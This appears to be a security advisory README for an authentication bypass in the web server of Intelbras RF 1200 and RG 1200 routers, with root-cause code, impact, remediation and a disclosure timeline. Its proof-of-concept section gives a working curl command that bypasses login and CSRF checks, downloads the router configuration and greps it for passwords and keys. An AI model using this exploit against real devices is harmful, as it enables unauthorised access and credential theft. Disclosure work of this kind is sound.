# Intelbras RF 1200 / RG 1200 — Universal Authentication Bypass

![Severity: Critical](https://img.shields.io/badge/Severity-Critical-critical)
![CVSS 9.8](https://img.shields.io/badge/CVSS_v3.1-9.8-red)
![CVE Pending](https://img.shields.io/badge/CVE-Pending-lightgrey)
![Disclosure: Coordinated](https://img.shields.io/badge/Disclosure-Coordinated-blue)

A single-parameter authentication bypass in the GoAhead HTTP server shipped with
Intelbras RF 1200 and RG 1200 routers grants **complete unauthenticated access to
the entire admin panel** — every endpoint, every function, every setting — to any
client on the LAN. No credentials are required at any stage. The device and the
target network are fully compromised by this vulnerability alone.

---

## Summary

| | |
|---|---|
| **Vendor** | Intelbras (Brazil) |
| **Affected devices** | RF 1200 (firmware v1.2.4), RG 1200 (firmware v2.1.9) |
| **Vulnerable binary** | `/bin/httpd` — GoAhead web server |
| **Vulnerable function** | `R7WebsSecurityHandler` |
| **Attack vector** | Network — LAN (unauthenticated) |
| **CVSS v3.1 vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CVSS v3.1 score** | **9.8 Critical** |
| **CVE** | Pending |
| **PoC** | Available in this repository — release pending coordinated disclosure deadline |

---

## Vulnerability Description

### Root Cause — Authentication Bypass

The GoAhead authentication hook `R7WebsSecurityHandler` in `/bin/httpd` checks
whether the requested URL corresponds to a public static asset using `strstr`:

```c
/* Simplified from disassembly of R7WebsSecurityHandler */
if (strstr(full_url, "img/main-logo.png") != NULL) {
    /* bypass authentication — treat as public resource */
    goto allow;
}
```

`full_url` is the complete request URI **including the query string**. Appending
`?img/main-logo.png` to any endpoint URL causes `strstr` to return non-null,
bypassing authentication for **every single handler and CGI endpoint** registered
in the GoAhead dispatch table — without exception.

This is not a partial or scoped bypass. Every form handler, every configuration
endpoint, every diagnostic function, and every file download endpoint on the
device becomes accessible to any unauthenticated client on the network.

### Secondary Weakness — CSRF Check Bypass

The same function calls `check_CSRF_attack`, which validates the `Referer` header
with an equally weak substring check:

```c
if (strstr(referer, "meuintelbras") != NULL) {
    /* CSRF check passes */
}
```

Sending `Referer: http://meuintelbras.local` (and `Origin: http://meuintelbras.local`)
satisfies this check from any origin. The string `"meuintelbras"` is the brand
hostname prefix hardcoded in the firmware. Both headers are included in the PoC.

---

## Impact

An unauthenticated attacker on the LAN (or on the WAN if remote management is
enabled) gains **total control over the device and can directly affect every
host on the target network**. This includes but is not limited to:

- **Reading all sensitive data** — WiFi WPA2 PSKs, admin credentials (MD5),
  PPPoE passwords, VPN secrets, full configuration database
- **Modifying any configuration** — changing WiFi passwords, DNS servers, firewall
  rules, port forwarding, LAN addressing, and any other setting accessible via the
  admin panel
- **Controlling all device services** — enabling or disabling interfaces, modifying
  routing, rebooting the device, triggering firmware operations
- **Full device and network compromise** — the bypass reaches endpoints that, when
  combined with other weaknesses present in this firmware, allow unauthenticated
  remote command execution as root; full details of the command execution chain are
  withheld pending responsible disclosure and due to the risk of misuse

> The configuration backup download demonstrated in the PoC below is one of the
> simplest examples of what this bypass enables. It is used as the public PoC
> because it is safe to reproduce, produces unambiguous output, and requires no
> additional exploitation steps. It does not reflect the full severity of the
> vulnerability.

---

## Proof of Concept

> **Note:** The full PoC script (`poc.pl`) is available in this repository.
> Its release is pending the coordinated disclosure deadline with the vendor.

The example below demonstrates unauthenticated configuration backup download —
**one of many** actions the bypass makes possible.

### Manual reproduction (curl)

```bash
curl -s \
  -H 'Referer: http://meuintelbras.local' \
  -H 'Origin: http://meuintelbras.local' \
  "http://10.0.0.1/cgi-bin/DownloadCfg?img/main-logo.png" \
  -o config.bin

# Inspect for plaintext credentials
strings -n 6 config.bin | grep -iE 'pass|psk|key|secret'
```

The bypass string `?img/main-logo.png` works identically against any other
endpoint on the device. The `Referer` and `Origin` headers containing
`meuintelbras` bypass the secondary CSRF check in the same function.

---

## Tested Environment

| Device | Firmware | HTTP Server | Result |
|---|---|---|---|
| Intelbras RF 1200 | v1.2.4 | GoAhead (debug build) | **Confirmed** |
| Intelbras RG 1200 | v2.1.9 | GoAhead (debug build) | **Confirmed** |

---

## Remediation

1. **Parse the URI path component** before performing any allowlist check.
   Do not apply `strstr` to the full URI string including query parameters.

2. **Use an exact-match allowlist** of permitted unauthenticated paths rather
   than a substring search.

3. **Fix the CSRF Referer check**: validate the `Referer` and `Origin` host
   against the device's configured LAN IP address, not a hardcoded brand name
   substring.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-09-22 | Vulnerability confirmed on RF 1200 v1.2.4 |
| 2026-09-23 | Confirmed on second device: RG 1200 v2.1.9 |
| 2026-09-23 | Vendor (Intelbras) notified |
| 2026-09-23 | Public advisory published; MITRE CVE submission |
| TBD | Vendor response / patch release |
| TBD | Full PoC release |

---

## References

- [MITRE CVE — Pending](https://cve.mitre.org)
- [Intelbras RF 1200 Product Page](https://www.intelbras.com/pt-br/roteador-ac-1200-dual-band-rf-1200/)
- [Intelbras RG 1200 Product Page](https://www.intelbras.com/pt-br/roteador-ac-1200-dual-band-rg-1200/)
- [GoAhead Web Server](https://embedthis.com/goahead/)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [CWE-200: Exposure of Sensitive Information to Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)

---

## Author

Security research conducted under authorized penetration testing engagement.  
Responsible disclosure coordinated with vendor prior to publication.  
Further exploitation details withheld pending vendor patch and responsible disclosure deadline.
